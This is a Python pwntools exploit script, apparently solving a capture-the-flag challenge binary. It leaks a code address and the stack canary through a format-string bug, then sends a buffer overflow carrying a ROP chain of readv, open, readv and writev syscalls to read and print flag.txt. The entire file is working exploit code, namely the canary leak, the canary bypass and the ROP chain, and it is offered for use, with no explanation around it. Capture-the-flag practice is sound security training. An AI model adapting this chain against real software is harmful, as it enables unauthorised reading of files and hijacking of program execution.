#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

p = elf.process()
#p = elf.debug(gdbscript="b vuln")
#p = remote("127.0.0.1", 9001)

leak = int(p.readline().decode(), 16)
elf.address = leak - elf.sym["setup"]

p.sendline(b"%11$p")
canary = int(p.recv().decode(), 16)

iovec = elf.bss() + 0xe00
scratch = iovec + 0x100
flag_size = 64
mov_rdi_rsi = elf.address + 0x1378 # mov qword ptr[rdi], rsi

rop = ROP(elf)
rop.raw(b"A" * 0x28)
rop.raw(p64(canary) + p64(0))

rop.rsi = scratch
rop.rdi = iovec
rop.raw(mov_rdi_rsi)

rop.rsi = flag_size
rop.rdi = iovec + 8
rop.raw(mov_rdi_rsi)

rop.rdi = constants.STDIN_FILENO
rop.rsi = iovec
rop.rdx = 1
rop.rax = constants.SYS_readv
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

rop.rdi = scratch
rop.rsi = 0
rop.rdx = 0
rop.rax = constants.SYS_open
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

rop.rdi = 3
rop.rsi = iovec
rop.rdx = 1
rop.rax = constants.SYS_readv
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

rop.rdi = 1
rop.rsi = iovec
rop.rdx = 1
rop.rax = constants.SYS_writev
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendline(rop.chain())
p.sendline(b"flag.txt\x00")

print(p.readuntil(b"}").decode())
